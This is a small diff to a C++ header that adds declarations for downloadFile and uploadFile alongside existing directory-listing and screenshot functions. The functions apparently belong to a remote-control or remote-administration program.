@@ -15,6 +15,10 @@ int pwd(Controller* ctrl);
 int changeDir(Controller* ctrl, const std::string dir);
 int listFiles(Controller* ctrl, const std::string dir);
 
+// files
+int downloadFile(Controller* ctrl, const std::string path);
+int uploadFile(Controller* ctrl, const std::string path, size_t size, const char* data);
+
 // screen
 int screenshot(Controller* ctrl);
 
